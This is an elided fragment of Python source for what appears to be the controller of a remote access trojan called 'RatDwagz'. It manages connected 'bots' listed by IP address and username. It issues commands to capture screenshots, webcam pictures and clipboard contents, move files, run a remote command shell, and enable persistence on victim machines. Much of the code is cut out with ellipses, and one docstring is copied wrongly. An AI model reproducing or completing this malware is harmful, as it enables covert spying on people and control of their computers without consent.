...
def connection_gate():
    ...
    s.bind((host, port))
    logging(data_to_log= '=================================================\n\tWelcome in RatDwagz\n\tWritten By lildwagz\n\tGithub : https://github.com/lildwagz\n=================================================', printer=True)
            ...
            if option == 'list':
                ...
                for bots_counter, bot in enumerate(connected_sockets):
                    if bot['status'] is True:
                        ...
                        inactive_bots_str += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
                printable_bots = active_bots_str + inactive_bots_str + '\n\n\nYou can interact with a bot using "bots [bot-number]"\n'
...
class CommandExecutorInput(cmd.Cmd):
    ...
    def do_SHreturn(self, option):
        ...
        logging(data_to_log='Returning to RatDwagz interactive mode...\n', printer=True)
        return True

    # ---------------------------------------------------------------------------------------------
    def default(self, command):
        if command != 'quit' and command != 'kill':
            sender(command)
            response = receiver()
...
class TinkererShellInput(cmd.Cmd):
    ...
    def do_screenshot(self, option):
        """SHscreenshot\n\tGrab a screenshot of the whole screen (multiple monitors supported)\n"""
        screenshot()

    # ---------------------------------------------------------------------------------------------
    # noinspection PyUnusedLocal
    def do_webcampic(self, option):
        """SHwebcampic\n\tGrab a picture using the webcam of the remote host\n"""
        webcam_pic()

    # ---------------------------------------------------------------------------------------------
    # noinspection PyUnusedLocal
    def do_clipboard(self, option):
        """SHwebcampic\n\tGrab a picture using the webcam of the remote host\n"""
        clip_copy()

    # ---------------------------------------------------------------------------------------------
    # noinspection PyUnusedLocal
    def do_download(self, option):
        """SHdownload\n\tDownload a file\n"""
        downloader()

    # ---------------------------------------------------------------------------------------------
    # noinspection PyUnusedLocal
    def do_upload(self, option):
        """SHupload\n\tUpload a file\n"""
        uploader()

    # ---------------------------------------------------------------------------------------------
    # noinspection PyUnusedLocal
    def do_exec(self, option):
        """SHexec\n\tUse remote system command shell\n"""
        command_executer()

    # ---------------------------------------------------------------------------------------------
    def do_persistence(self, option):
        # noinspection PyPep8
        ...
        if option == 'enable':
            sender('persistenceenable')
            receiver(printer=True)
        elif option == 'disable':
            sender('persistencedisable')
            receiver(printer=True)
        elif option == 'status':
            sender('persistencestatus')
            receiver(printer=True)
        else:
            print('Aborted: unknown option\n')
    ...
    # ---------------------------------------------------------------------------------------------
    # noinspection PyUnusedLocal
    def do_return(self, option):
        """SHreturn\n\tReturn to TinkererShell bot selection mode.\n"""
        logging(data_to_log='Returning to RatDwagz bot selection mode...\n', printer=True)
        return True

    # noinspection PyUnusedLocal
    def do_kill(self, option):
